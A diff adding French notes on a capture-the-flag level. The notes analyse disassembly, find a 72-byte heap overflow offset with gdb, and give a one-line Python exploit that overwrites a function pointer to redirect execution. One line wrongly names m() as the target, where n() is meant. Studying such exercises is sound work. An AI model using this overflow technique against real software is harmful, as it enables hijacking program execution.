@@ -1,0 +1,63 @@
+Fait 2 mallocs : Un de 64 et un autre de 4.
+
+<+37> eax a l'adresse 0x804a050 qu'il stock dans 0x18(%esp).
+<+41> L'adresse 0x8048468 est stocke dans edx.
+<+46> On remet l'adresse 0x804a050 contenue dans 0x18(%esp) dans %eax.
+<+50> On met edx (0x8048468) dans la memoire pointee par (%eax) (0x804a050)
+<+52> On met 0xc(%ebp) (argv) dans eax.
+<+55> on ajoute 4 a eax pour qu'il passe a l'adresse qui contient argv[1] (add $0x4, %eax)
+<+58> on prend le contenu de l'adresse de argv[1] et le stock dans %eax.
+<+60> on met le contenu de eax (argv[1]) dans %edx
+<+62> On met le premier malloc dans %eax
+<+66> on met le contenu de %edx (argv[1]) dans esp+4 (0x4(%esp))
+<+70> On met le malloc dans la memoire de esp ((%esp) = malloc, (%esp+4) = argv[1])
+<+73> strcpy avec le malloc (buffer) puis argv[1]
+<+78> On met l'adresse du deuxieme malloc dans %eax (0x804a050)
+<+82> On met le contenu de (%eax)(0x8048468) dans %eax.
+<+84> appel fonction a l'adresse fonction contenue dans %eax (0x8048468)
+
+0x8048468 est l'adresse de la fonction m().
+Seulement nous on veut aller dans la fonction n(), car c'est la ou est notre flag.
+
+Il faut donc trouver comment changer l'adresse contenue dans 0x18(%esp).
+0x18(%esp) est l'adresse du retour du deuxieme malloc().
+On peut donc overflow le premier malloc grace a strcpy, pour depasser jusqu'a arriver
+a l'adresse du deuxieme malloc.
+
+On cherche l'offset >
+Breakpoint 1, 0x080484a5 in main () --- > Adresse du mov de l'adresse de m() vers edx
+
+x/wx $esp+0x1c
+0xbffff71c:	0x0804a008 ---- > Premier malloc adresse
+
+(gdb) x/wx $esp+0x18 ---- > Deuxieme malloc adresse
+0xbffff718:	0x0804a050
+
+On trouve l'offset en faisant la difference, 0x50 = 80, 0x08 = 8.
+80 - 8 = 72. On a donc un offset de 72.
+
+Manque plus qu'a faire un padding de 72 et rajouter l'adresse de m()
+
+./level6 "$(python -c 'print "A"*72 + "\x54\x84\x04\x08"')"
+
+
+
+
+
+
+0x08048491 <+21>:	mov    %eax,0x1c(%esp)
+    eax = 0x804a008 = null
+    mov -> eax (0x804a008) = 28
+
+0x080484a1 <+37>:	mov    %eax,0x18(%esp)
+    eax = 0x804a050 = null
+    mov -> eax (0x804a050) = 24
+
+=> 0x080484ce <+82>:	mov    (%eax),%eax
+   0x080484d0 <+84>:	call   *%eax
+   0x080484d2 <+86>:	leave
+   0x080484d3 <+87>:	ret
+
+eax = 0x804a050
+0x804a050 = 0x08048400 = 0xa301c083
+
